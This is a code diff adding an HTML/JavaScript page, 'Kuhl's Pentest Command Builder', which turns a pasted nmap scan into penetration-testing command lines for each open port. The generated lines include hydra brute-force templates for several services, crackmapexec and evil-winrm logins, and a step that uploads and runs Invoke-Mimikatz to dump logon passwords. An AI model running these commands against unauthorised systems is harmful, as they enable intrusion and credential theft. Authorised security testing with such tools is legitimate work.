@@ -1,3 +1,497 @@
-<center><a href="mindmap/pen_workflow.html" style="font-size: 2em;">Interactive Pentest Workflow (Work in progress)</a></center></br>
-<center><a href="mindmap/pen_workflow-v20.html" style="font-size: 2em;">Interactive Pentest Workflow V2.0 (Work in progress)</a></center></br>
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Kuhl's Pentest Command Builder</title>
+<style>
+  :root { color-scheme: light dark; }
+  body { font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif; margin: 14px; line-height: 1.25; font-size: 0.78rem; }
+  h1 { font-size: 0.95rem; margin: 0 0 10px; }
+  fieldset { border: 1px solid #8884; border-radius: 8px; padding: 8px; margin: 0 0 12px; }
+  legend { padding: 0 4px; opacity: 0.85; font-size: 0.78rem; }
+  .top-row { display: flex; gap: 6px; flex-wrap: wrap; margin-bottom: 6px; }
+  .top-row input, .top-row textarea { flex: 1; min-width: 140px; }
+  input[type="text"], input[type="password"], textarea { width: 100%; padding: 5px 8px; border: 1px solid #8884; border-radius: 6px; font-size: 0.78rem; }
+  textarea { min-height: 110px; resize: vertical; }
+  .ports { display: grid; grid-template-columns: repeat(auto-fill, minmax(110px, 1fr)); gap: 4px 6px; max-height: 320px; overflow: auto; padding: 6px; border: 1px solid #8884; border-radius: 8px; }
+  label.chk { display: flex; align-items: center; gap: 4px; font-size: 0.72rem; }
+  .actions { display: flex; gap: 6px; flex-wrap: wrap; margin-top: 6px; }
+  button { border: 0; padding: 6px 10px; border-radius: 6px; cursor: pointer; font-weight: 600; background: #4f46e5; color: #fff; font-size: 0.72rem; }
+  button.secondary { background: #0ea5e9; }
+  button.ghost { background: #eee; color: #111; }
+  pre { background: #111; color: #f5f5f5; padding: 6px; border-radius: 6px; overflow: auto; font-size: 0.72rem; max-height: 460px; }
+  .hint { font-size: 0.68rem; opacity: 0.75; }
 
+  .links { display: grid; grid-template-columns: 1fr; gap: 6px; max-height: 220px; overflow: auto; padding: 6px; border: 1px solid #8884; border-radius: 8px; }
+  .links a { text-decoration: none; padding: 6px; border: 1px dashed #8884; border-radius: 6px; display: block; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+  .links a:hover { background: #8881; }
+  .controls-inline { display: flex; gap: 10px; align-items: center; }
+  .controls-inline label { display: inline-flex; align-items: center; gap: 6px; font-size: 0.74rem; }
+</style>
+</head>
+<body>
+    <h1>Kuhl's Pentest Command Builder</h1>
+
+  <fieldset>
+    <legend>Target Info</legend>
+    <div class="top-row">
+      <input id="ip" type="text" placeholder="IP / Host" />
+      <input id="user" type="text" placeholder="Username (optional)" />
+      <input id="pass" type="password" placeholder="Password (optional)" />
+      <input id="domain" type="text" placeholder="Domain/Realm (optional)" />
+    </div>
+  </fieldset>
+
+  <fieldset>
+    <legend>Nmap Results</legend>
+    <div class="top-row">
+      <textarea id="nmapInput" placeholder="Paste nmap normal output here"></textarea>
+    </div>
+    <div class="actions controls-inline">
+      <button type="button" class="ghost" id="parseNmap">Parse Nmap</button>
+      <label><input type="checkbox" id="includeFiltered" checked> Include filtered ports when selecting</label>
+      <button type="button" class="ghost" id="clearLinks">Clear links</button>
+      <button type="button" class="ghost" id="clearPorts">Clear ports</button>
+    </div>
+  </fieldset>
+
+  <fieldset>
+    <legend>Search links (open ports)</legend>
+    <div id="portLinks" class="links"></div>
+  </fieldset>
+
+  <fieldset>
+    <legend>Ports</legend>
+    <div class="ports" id="ports"></div>
+    <div class="actions">
+      <button type="button" class="ghost" id="selectCommon">Select common</button>
+      <button type="button" class="ghost" id="selectAll">Select all</button>
+      <button type="button" class="ghost" id="clearAll">Clear</button>
+    </div>
+  </fieldset>
+
+  <div class="actions">
+    <button id="build">Build commands</button>
+    <button id="copy" class="secondary">Copy all</button>
+  </div>
+
+  <pre id="out"># Commands will appear here…</pre>
+
+<script>
+document.addEventListener('DOMContentLoaded', () => {
+  const PORTS = [
+    [21,'FTP'], [22,'SSH'], [23,'Telnet'],
+    [25,'SMTP'], [53,'DNS'],
+    [80,'HTTP'], [110,'POP3'], [111,'RPCbind'],
+    [135,'MSRPC'], [139,'SMB'], [143,'IMAP'],
+    [161,'SNMP'], [389,'LDAP'], [443,'HTTPS'], [445,'SMB'],
+    [465,'SMTPS'], [587,'SMTP-Sub'], [636,'LDAPS'],
+    [993,'IMAPS'], [995,'POP3S'],
+    [1433,'MSSQL'], [1521,'Oracle'],
+    [1900,'SSDP (UDP)'], [2049,'NFS'], [2375,'Docker API'],
+    [3000,'Dev web'], [3306,'MySQL'],
+    [3389,'RDP'], [5000,'Web/Flask'],
+    [5431,'UPnP'], [5432,'Postgres'], [5601,'Kibana'],
+    [5900,'VNC'], [5985,'WinRM'], [5986,'WinRM(S)'],
+    [6379,'Redis'], [8000,'HTTP-alt'], [8080,'HTTP-alt'], [8081,'HTTP-alt'],
+    [8443,'HTTPS-alt'], [9000,'Dev svc'], [9200,'Elastic']
+  ];
+
+  const portsEl  = document.getElementById('ports');
+  const ipEl     = document.getElementById('ip');
+  const userEl   = document.getElementById('user');
+  const passEl   = document.getElementById('pass');
+  const domainEl = document.getElementById('domain');
+  const outEl    = document.getElementById('out');
+  const nmapEl   = document.getElementById('nmapInput');
+  const linksEl  = document.getElementById('portLinks');
+  const includeFilteredEl = document.getElementById('includeFiltered');
+
+  // Build initial checkbox grid
+  PORTS.forEach(([p,label])=> ensurePortCheckbox(p, label));
+
+  function ensurePortCheckbox(port, label='(parsed)'){
+    const id = 'p' + port;
+    if(document.getElementById(id)) return;
+    const wrap = document.createElement('label');
+    wrap.className = 'chk';
+    wrap.setAttribute('for', id);
+    wrap.innerHTML = `<input id="${id}" type="checkbox" value="${port}"><span>${port} <span class="hint">${label}</span></span>`;
+    portsEl.appendChild(wrap);
+  }
+
+  // Helpers
+  function shellEscape(s){
+    if(s===undefined || s===null) return '';
+    if(s === '') return "''";
+    return `'${String(s).replace(/'/g,"'\\''")}'`;
+  }
+  function getSelectedPorts(){
+    const set = new Set();
+    portsEl.querySelectorAll('input[type=checkbox]:checked').forEach(cb=> set.add(parseInt(cb.value,10)));
+    return [...set].sort((a,b)=>a-b);
+  }
+  function clearPorts(){ portsEl.querySelectorAll('input[type=checkbox]').forEach(cb=> cb.checked = false); }
+  function clearLinks(){ linksEl.innerHTML = ''; }
+
+  // Quick-selects
+  document.getElementById('selectCommon').addEventListener('click', ()=>{
+    const commons = new Set([21,22,23,25,53,80,139,143,389,443,445,1433,3306,3389,5432,5985,5986,6379,8080,8443]);
+    portsEl.querySelectorAll('input[type=checkbox]').forEach(cb=> cb.checked = commons.has(parseInt(cb.value,10)));
+  });
+  document.getElementById('selectAll').addEventListener('click', ()=>{
+    portsEl.querySelectorAll('input[type=checkbox]').forEach(cb=> cb.checked = true);
+  });
+  document.getElementById('clearAll').addEventListener('click', clearPorts);
+  document.getElementById('clearPorts').addEventListener('click', clearPorts);
+  document.getElementById('clearLinks').addEventListener('click', clearLinks);
+
+  // Parse Nmap results
+  document.getElementById('parseNmap').addEventListener('click', ()=>{
+    const txt = nmapEl.value || '';
+    if(!txt.trim()) return;
+
+    // Try to set IP/host from "Nmap scan report for"
+    const ipMatch = txt.match(/Nmap scan report for .*?\((\d{1,3}(?:\.\d{1,3}){3})\)/) ||
+                    txt.match(/Nmap scan report for\s+(\d{1,3}(?:\.\d{1,3}){3})/);
+    if(ipMatch) ipEl.value = ipMatch[1] || ipMatch[0].split('for').pop().trim();
+
+    // Collect lines & ports
+    const includeFiltered = includeFilteredEl.checked;
+    const openLineRe = /^\s*(\d{1,5})\/(tcp|udp)\s+open(?:\S*)\s+.*$/gmi;
+    const filteredLineRe = /^\s*(\d{1,5})\/(tcp|udp)\s+filtered\s+.*$/gmi;
+
+    clearLinks();
+    const toSelect = new Set();
+
+    // Open ports -> select + link
+    let m;
+    while((m = openLineRe.exec(txt)) !== null){
+      const fullLine = m[0].trim();
+      const portNum = parseInt(m[1], 10);
+      if(!isNaN(portNum)){
+        ensurePortCheckbox(portNum);
+        toSelect.add(portNum);
+
+        // Build a Google link for the entire line
+        const a = document.createElement('a');
+        a.href = 'https://www.google.com/search?q=' + encodeURIComponent(fullLine);
+        a.target = '_blank';
+        a.rel = 'noopener';
+        a.textContent = fullLine;
+        linksEl.appendChild(a);
+      }
+    }
+
+    // Optionally include filtered ports in selection (no links)
+    if(includeFiltered){
+      let f;
+      while((f = filteredLineRe.exec(txt)) !== null){
+        const portNum = parseInt(f[1], 10);
+        if(!isNaN(portNum)){
+          ensurePortCheckbox(portNum);
+          toSelect.add(portNum);
+        }
+      }
+    }
+
+    // Apply selection
+    portsEl.querySelectorAll('input[type=checkbox]').forEach(cb=>{
+      const val = parseInt(cb.value,10);
+      cb.checked = toSelect.has(val);
+    });
+  });
+
+  // Build commands
+  document.getElementById('build').addEventListener('click', ()=>{
+    const host   = ipEl.value.trim();
+    const user   = userEl.value.trim();
+    const pass   = passEl.value;
+    const domain = domainEl.value.trim();
+    const ports  = getSelectedPorts();
+
+    if(!host){ outEl.textContent = '# Please enter an IP/host.'; return; }
+    if(!ports.length){ outEl.textContent = '# Please select at least one port.'; return; }
+
+    const cmds = [];
+
+    // ---------- WEB ----------
+    const webPorts = ports.filter(p => [80,443,8080,8081,8000,8443,3000,5000,5601,9000].includes(p));
+    webPorts.forEach(p=>{
+      const httpsLike = [443,8443].includes(p);
+      const scheme = httpsLike ? 'https' : 'http';
+      const url = `${scheme}://${host}:${p}`;
+      cmds.push(`# Web ${p}`);
+      cmds.push(`whatweb ${url}`);
+      cmds.push(`wafw00f -a ${url}`);
+      cmds.push(`gobuster dir -u ${url} -w wordlists/dir-medium.txt${httpsLike ? ' -k' : ''}`);
+      cmds.push(`ffuf -u ${url}/FUZZ -w wordlists/dir-medium.txt -mc 200,204,301,302,307,401,403${httpsLike ? ' -k' : ''}`);
+      cmds.push(`nikto -h ${host} -p ${p}`);
+      if(httpsLike){
+        cmds.push(`sslscan ${host}:${p}`);
+        cmds.push(`testssl.sh --quiet ${host}:${p}`);
+      }
+    });
+
+    // ---------- SSH (22) ----------
+    if(ports.includes(22)){
+      cmds.push('# SSH');
+      if(user){
+        cmds.push(`ssh ${shellEscape(user)}@${host}`);
+        if(pass){
+          // direct non-interactive login helper (requires sshpass)
+          cmds.push(`sshpass -p ${shellEscape(pass)} ssh ${shellEscape(user)}@${host}`);
+        }
+      } else {
+        cmds.push(`ssh ${host}`);
+      }
+      // Brute-force template
+      const u = user ? `-l ${shellEscape(user)}` : '-L users.txt';
+      const p = pass ? `-p ${shellEscape(pass)}` : '-P passwords.txt';
+      cmds.push(`hydra -t 4 ${u} ${p} ssh://${host}`);
+    }
+
+    // ---------- FTP (21) ----------
+    if(ports.includes(21)){
+      cmds.push('# FTP');
+      if(user && pass){
+        cmds.push(`lftp -u ${shellEscape(user)},${shellEscape(pass)} ${host}`);
+        cmds.push(`curl -v -u ${shellEscape(user+':'+pass)} ftp://${host}/`);
+      } else if(user && !pass){
+        cmds.push(`lftp -u ${shellEscape(user)} ${host}`);
+        cmds.push(`ftp ${host}`);
+      } else {
+        cmds.push(`ftp ${host}`);
+      }
+      // Brute-force template
+      const u = user ? `-l ${shellEscape(user)}` : '-L users.txt';
+      const p = pass ? `-p ${shellEscape(pass)}` : '-P passwords.txt';
+      cmds.push(`hydra -t 4 ${u} ${p} ftp://${host}`);
+    }
+
+    // ---------- TELNET (23) ----------
+    if(ports.includes(23)){
+      cmds.push('# Telnet');
+      if(user){
+        // many telnet clients support -l for username; password will be prompted
+        cmds.push(`telnet -l ${shellEscape(user)} ${host} 23`);
+      } else {
+        cmds.push(`telnet ${host} 23`);
+      }
+      // Brute-force template
+      const u = user ? `-l ${shellEscape(user)}` : '-L users.txt';
+      const p = pass ? `-p ${shellEscape(pass)}` : '-P passwords.txt';
+      cmds.push(`hydra -t 4 ${u} ${p} -s 23 telnet://${host}`);
+    }
+
+    // ---------- RPCBIND (111) ----------
+    if(ports.includes(111)){
+      cmds.push('# RPCbind');
+      cmds.push(`rpcinfo -p ${host}`);
+    }
+
+    // ---------- MSRPC (135) ----------
+    if(ports.includes(135)){
+      cmds.push('# MSRPC');
+      cmds.push(`rpcclient -U "" -N ${host}`);
+    }
+
+    // ---------- SMB (139/445) ----------
+    if(ports.some(p=>p===139||p===445)){
+      cmds.push('# SMB');
+      const u = user ? `-u ${shellEscape(user)}` : '';
+      const pw = pass ? `-p ${shellEscape(pass)}` : '';
+      const d = domain ? `-d ${shellEscape(domain)}` : '';
+      cmds.push(`enum4linux-ng -A ${host}`);
+      cmds.push(`smbmap -H ${host} ${u} ${pw} ${d}`.replace(/\s+/g,' ').trim());
+      cmds.push(`smbclient -L \\\\${host} -N`);
+      if(user && pass){
+        cmds.push(`crackmapexec smb ${host} -u ${shellEscape(user)} -p ${shellEscape(pass)} ${domain ? '-d ' + shellEscape(domain) : ''}`.replace(/\s+/g,' ').trim());
+      } else {
+        cmds.push(`crackmapexec smb ${host} --shares`);
+      }
+    }
+
+    // ---------- WinRM (5985/5986) ----------
+    if(ports.some(p=>p===5985||p===5986)){
+      cmds.push('# WinRM');
+      const u = user ? `-u ${shellEscape(user)}` : '';
+      const p = pass ? `-p ${shellEscape(pass)}` : '';
+      const r = domain ? `-r ${shellEscape(domain)}` : ''; // realm
+      cmds.push(`evil-winrm ${u} ${p} ${r} -i ${host}`.replace(/\s+/g,' ').trim());
+      if(user && pass){
+        cmds.push(`# Mimikatz via WinRM (requires Invoke-Mimikatz.ps1 locally)`);
+        cmds.push(`evil-winrm ${u} ${p} ${r} -i ${host} -s .`.replace(/\s+/g,' ').trim());
+        cmds.push(`# Inside evil-winrm session:`);
+        cmds.push(`upload Invoke-Mimikatz.ps1`);
+        cmds.push(`powershell -ep bypass -c "Import-Module .\\Invoke-Mimikatz.ps1; Invoke-Mimikatz -Command \\"sekurlsa::logonpasswords\\""`);
+      }
+    }
+
+    // ---------- MSSQL (1433) ----------
+    if(ports.includes(1433)){
+      cmds.push('# MSSQL');
+      const u = user || 'user';
+      const pw = pass || 'password';
+      const dom = domain ? (domain + '/') : '';
+      cmds.push(`mssqlclient.py ${dom}${u}:${pw}@${host} -windows-auth`);
+      if(user && pass){
+        cmds.push(`crackmapexec mssql ${host} -u ${shellEscape(user)} -p ${shellEscape(pass)} ${domain ? '-d ' + shellEscape(domain) : ''}`.replace(/\s+/g,' ').trim());
+      }
+    }
+
+    // ---------- MySQL (3306) ----------
+    if(ports.includes(3306)){
+      cmds.push('# MySQL');
+      if(user && pass){
+        cmds.push(`mysql -h ${host} -P 3306 -u ${shellEscape(user)} -p`);
+      } else {
+        const u = user ? `-l ${shellEscape(user)}` : '-L users.txt';
+        const p = pass ? `-p ${shellEscape(pass)}` : '-P passwords.txt';
+        cmds.push(`hydra -t 4 ${u} ${p} -s 3306 mysql://${host}`);
+      }
+    }
+
+    // ---------- Postgres (5432) ----------
+    if(ports.includes(5432)){
+      cmds.push('# Postgres');
+      if(user && pass){
+        cmds.push(`psql "postgresql://${encodeURIComponent(user)}:${encodeURIComponent(pass)}@${host}:5432/postgres"`);
+      } else {
+        const u = user ? `-l ${shellEscape(user)}` : '-L users.txt';
+        const p = pass ? `-p ${shellEscape(pass)}` : '-P passwords.txt';
+        cmds.push(`hydra -t 4 ${u} ${p} -s 5432 postgres://${host}`);
+      }
+    }
+
+    // ---------- UPnP Belkin/Linksys (5431/tcp) ----------
+    if(ports.includes(5431)){
+      cmds.push('# UPnP (5431/tcp)');
+      // Keep upnp-info without -p to avoid PowerShell ambiguity issues
+      cmds.push(`nmap --script upnp-info ${host}`);
+      cmds.push(`curl -s http://${host}:5431/setup.xml`);
+      cmds.push(`curl -s http://${host}:5431/rootDesc.xml`);
+      cmds.push(`# If miniupnpc is available:`);
+      cmds.push(`upnpc -l`);
+      cmds.push(`# upnpc -u http://${host}:5431/upnp/control/WANIPConn1 -s`);
+    }
+
+    // ---------- SSDP / UPnP discovery (1900/udp) ----------
+    if(ports.includes(1900)){
+      cmds.push('# SSDP (1900/udp)');
+      cmds.push(`nmap -sU -p 1900 --script broadcast-upnp-info ${host}`);
+      cmds.push(`# gssdp-discover --timeout=5 --target=ssdp:all`);
+    }
+
+    // ---------- RDP (3389) ----------
+    if(ports.includes(3389)){
+      cmds.push('# RDP');
+      const u = user ? `/u:${user}` : '/u:USER';
+      const p = pass ? `/p:${pass}` : '/p:PASSWORD';
+      const d = domain ? `/d:${domain}` : '';
+      cmds.push(`xfreerdp /v:${host} ${u} ${p} ${d} /cert:ignore`.replace(/\s+/g,' ').trim());
+    }
+
+    // ---------- Redis (6379) ----------
+    if(ports.includes(6379)){
+      cmds.push('# Redis');
+      const a = pass ? `-a ${shellEscape(pass)}` : '';
+      cmds.push(`redis-cli -h ${host} -p 6379 ${a}`.replace(/\s+/g,' ').trim());
+    }
+
+    // ---------- DNS (53) ----------
+    if(ports.includes(53)){
+      cmds.push('# DNS');
+      cmds.push(`dig @${host} any .`);
+      cmds.push(`dig @${host} -x ${host}`);
+      cmds.push(`dnsenum ${host}`);
+    }
+
+    // ---------- LDAP / LDAPS (389/636) ----------
+    if(ports.some(p=>p===389||p===636)){
+      const scheme = ports.includes(636) ? 'ldaps' : 'ldap';
+      cmds.push('# LDAP');
+      if(user && pass){
+        cmds.push(`ldapsearch -x -H ${scheme}://${host} -D ${shellEscape(user)} -w ${shellEscape(pass)} -b "" -s base "(objectClass=*)"`);
+      } else {
+        cmds.push(`ldapsearch -x -H ${scheme}://${host} -b "" -s base "(objectClass=*)"`);
+      }
+    }
+
+    // ---------- Email services via Hydra ----------
+    const mail = [
+      [110,'pop3'], [995,'pop3s'], [143,'imap'], [993,'imaps'],
+      [25,'smtp'], [465,'smtps'], [587,'smtp']
+    ];
+    mail.forEach(([pp,proto])=>{
+      if(ports.includes(pp)){
+        cmds.push(`# ${proto.toUpperCase()}`);
+        const u = user ? `-l ${shellEscape(user)}` : '-L users.txt';
+        const pw = pass ? `-p ${shellEscape(pass)}` : '-P passwords.txt';
+        cmds.push(`hydra -t 4 ${u} ${pw} -s ${pp} ${proto}://${host}`);
+        if(proto.startsWith('smtp')) cmds.push(`smtp-user-enum -M VRFY -U users.txt -t ${host} -p ${pp}`);
+      }
+    });
+
+    // ---------- VNC (5900) ----------
+    if(ports.includes(5900)){
+      cmds.push('# VNC');
+      const pw = pass ? `-p ${shellEscape(pass)}` : '-P passwords.txt';
+      cmds.push(`hydra -t 4 ${pw} -s 5900 vnc://${host}`);
+    }
+
+    // ---------- Oracle (1521) ----------
+    if(ports.includes(1521)){
+      const uo = user || 'scott';
+      const pwo = pass || 'tiger';
+      cmds.push('# Oracle');
+      cmds.push(`sqlplus ${uo}/${pwo}@${host}:1521/ORCL`);
+    }
+
+    // ---------- Elasticsearch (9200) ----------
+    if(ports.includes(9200)){
+      cmds.push('# Elasticsearch');
+      cmds.push(`curl -s http://${host}:9200/`);
+      cmds.push(`curl -s http://${host}:9200/_cat/indices?v`);
+    }
+
+    // ---------- Docker Remote API (2375) ----------
+    if(ports.includes(2375)){
+      cmds.push('# Docker (remote API)');
+      cmds.push(`curl -s http://${host}:2375/version`);
+      cmds.push(`curl -s http://${host}:2375/containers/json`);
+      cmds.push(`docker -H tcp://${host}:2375 version`);
+    }
+
+    // ---------- NFS (2049) ----------
+    if(ports.includes(2049)){
+      cmds.push('# NFS');
+      cmds.push(`showmount -e ${host}`);
+      cmds.push(`# mount -t nfs ${host}:/SHARE /mnt/nfs_test  # requires privileges`);
+    }
+
+    // ---------- SNMP (161) ----------
+    if(ports.includes(161)){
+      cmds.push('# SNMP');
+      cmds.push(`onesixtyone -c community.txt ${host}`);
+      cmds.push(`snmpwalk -v2c -c public ${host} 1.3.6.1.2.1.1`);
+      cmds.push(`snmp-check ${host}`);
+    }
+
+    // ---------- Nmap vuln scripts per selected port ----------
+    cmds.push('# Nmap (vuln NSE) per-port');
+    ports.forEach(pp=>{
+      cmds.push(`nmap --script vuln -p ${pp} ${host}`);
+    });
+
+    outEl.textContent = cmds.join('\n');
+  });
+
+  document.getElementById('copy').addEventListener('click', async ()=>{
+    try { await navigator.clipboard.writeText(outEl.textContent); } catch {}
+  });
+});
+</script>
+</body>
+</html>
